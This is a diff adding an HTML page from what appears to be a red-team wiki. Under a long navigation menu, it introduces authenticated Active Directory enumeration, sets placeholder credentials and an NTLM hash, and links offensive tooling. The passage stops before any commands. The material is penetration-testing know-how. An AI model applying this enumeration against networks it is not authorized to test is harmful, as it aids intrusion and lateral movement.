@@ -1,0 +1,3476 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/AD/Auth_Attacks/">
+      
+      
+        <link rel="prev" href="../Unauth_Attacks/">
+      
+      
+        <link rel="next" href="../Credential_Access/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>Authenticated Attacks - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#authenticated-enumeration" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Authenticated Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Active Directory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../AD_Fundamentals/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fundamentals
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Unauth_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Unauthenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authenticated Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#domain-context" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Domain Context
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Users
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#groups" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Groups
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#computers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Computers
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sessions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Sessions
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#shares" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Shares
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#gpos" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GPOs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#acls" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ACLs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trusts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trusts
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#spns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SPNs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#delegation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Delegation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#adcs-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ADCS Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bloodhound-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        BloodHound Collection
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sharphound-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SharpHound Collection
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Credential_Access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Kerberos_Attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NTLM_Relay_and_Coercion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM Relay & Coercion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ACL_Abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL Abuse
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Lateral_Movement/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Priv_Escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Privilege Escalation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Domain_Compromise/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Compromise
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Persistance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Persistance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Forest_and_Trusts/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cross Forest & Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Toolset/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Toolset
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/File_Upload/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web/IDOR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    IDOR (Insecure Direct Object Reference)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Networking & Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Networking & Infrastructure
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Networking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Network Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Modern Architecture
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Modern Architecture
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Cloud/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cloud
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Containers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Containers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Virtualization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Virtualization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="authenticated-enumeration">Authenticated Enumeration</h1>
+<p>Authenticated enumeration starts after obtaining at least one valid domain credential.</p>
+<p>A low-privileged domain user can usually read a lot of directory information. The goal is to map the domain, identify users, groups, computers, sessions, shares, policies, ACLs, trusts, SPNs, delegation settings, AD CS objects, and BloodHound attack paths.</p>
+<p>Basic variables used in examples:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DOMAIN</span><span class="o">=</span>corp.local
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NETBIOS</span><span class="o">=</span>CORP
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="nb">export</span><span class="w"> </span><span class="nv">USER</span><span class="o">=</span>alice
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">export</span><span class="w"> </span><span class="nv">PASS</span><span class="o">=</span><span class="s1">&#39;Password123!&#39;</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_IP</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nb">export</span><span class="w"> </span><span class="nv">DC_HOST</span><span class="o">=</span>dc01.corp.local
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span><span class="m">10</span>.10.10.10
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="nb">export</span><span class="w"> </span><span class="nv">RANGE</span><span class="o">=</span><span class="m">10</span>.10.10.0/24
+</span></code></pre></div>
+<p>Hash-based examples use:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">export</span><span class="w"> </span><span class="nv">NTLM</span><span class="o">=</span><span class="s1">&#39;8846f7eaee8fb117ad06bdd830b7586c&#39;</span>
+</span></code></pre></div>
+<p>Useful resources:</p>
+<ul>
+<li><a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html">HackTricks - Active Directory Methodology</a></li>
+<li><a href="https://www.thehacker.recipes/ad/">The Hacker Recipes - Active Directory</a></li>
+<li><a href="https://www.netexec.wiki/">NetExec Documentation</a></li>
+<li><a href="https://bloodhound.specterops.io/">BloodHound CE Documentation</a></li>
+<li><a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">SharpHound CE Documentation</a></li>
+<li><a href="https://github.com/ly4k/Certipy">Certipy</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a></li>
+<li><a href="https://github.com/fortra/impacket">Impacket</a></li>
+<li><a href="https://wadcoms.github.io/">WADComs</a></li>
+</ul>
+<hr />
+<h2 id="domain-context">Domain Context</h2>
+<p>Domain context is the first authenticated step.</p>
+<p>The goal is to confirm where the credential works, what the domain is called, which domain controllers exist, what the domain SID is, what the password policy looks like, and whether LDAP/SMB/WinRM access is available.</p>
+<p><strong>Validate credentials</strong></p>
